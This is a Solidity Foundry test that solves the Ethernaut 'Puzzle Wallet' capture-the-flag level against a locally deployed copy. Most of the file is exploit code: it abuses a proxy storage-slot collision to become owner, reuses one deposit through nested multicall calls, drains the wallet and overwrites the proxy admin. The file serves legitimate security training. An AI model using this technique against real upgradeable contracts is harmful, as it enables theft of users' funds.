pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../PuzzleWallet/PuzzleWalletFactory.sol";
import "./utils/vm.sol";

contract PuzzleWalletTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    address eoaAddress = address(100);

    // Memory cannot hold dynamic byte arrays must be storage
    bytes[] depositData = [abi.encodeWithSignature("deposit()")];
    bytes[] multicallData = [abi.encodeWithSignature("deposit()"), abi.encodeWithSignature("multicall(bytes[])", depositData)];

    event IsTrue(bool answer);

    function setUp() public {
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testPuzzleWalletHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        PuzzleWalletFactory puzzleWalletFactory = new PuzzleWalletFactory();
        (address levelAddressProxy, address levelAddressWallet) = puzzleWalletFactory.createInstance{value: 1 ether}();
        PuzzleProxy ethernautPuzzleProxy = PuzzleProxy(payable(levelAddressProxy));
        PuzzleWallet ethernautPuzzleWallet = PuzzleWallet(payable(levelAddressWallet));
        
        vm.startPrank(eoaAddress);
        
        //////////////////
        // LEVEL ATTACK //
        //////////////////

        emit log_address(ethernautPuzzleProxy.admin());
        emit log_address(ethernautPuzzleWallet.owner());

        ethernautPuzzleProxy.proposeNewAdmin(eoaAddress);
        emit log_address(ethernautPuzzleWallet.owner());

        emit IsTrue(ethernautPuzzleWallet.whitelisted(eoaAddress));
        ethernautPuzzleWallet.addToWhitelist(eoaAddress);
        ethernautPuzzleWallet.addToWhitelist(levelAddressWallet);
        emit IsTrue(ethernautPuzzleWallet.whitelisted(eoaAddress));

        // Call multicall with multicallData above enables us to double deposit 
        ethernautPuzzleWallet.multicall{value: 1 ether}(multicallData);

        // Withdraw funds so balance of contract is 0 
        ethernautPuzzleWallet.execute(eoaAddress, 2 ether, bytes(""));

        // Check who current admin is of proxy
        assertTrue((ethernautPuzzleProxy.admin() != eoaAddress));


        // Set max balance to your address, there's no separation between the storage layer of the proxy 
        // and the puzzle wallet - this means when you to maxbalance (slot 1) you also write to the proxy admin variable 
        ethernautPuzzleWallet.setMaxBalance(uint256(uint160(eoaAddress)));

        
        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        // Verify We have become admin
        assertTrue((ethernautPuzzleProxy.admin() == eoaAddress));
        vm.stopPrank();
    }
}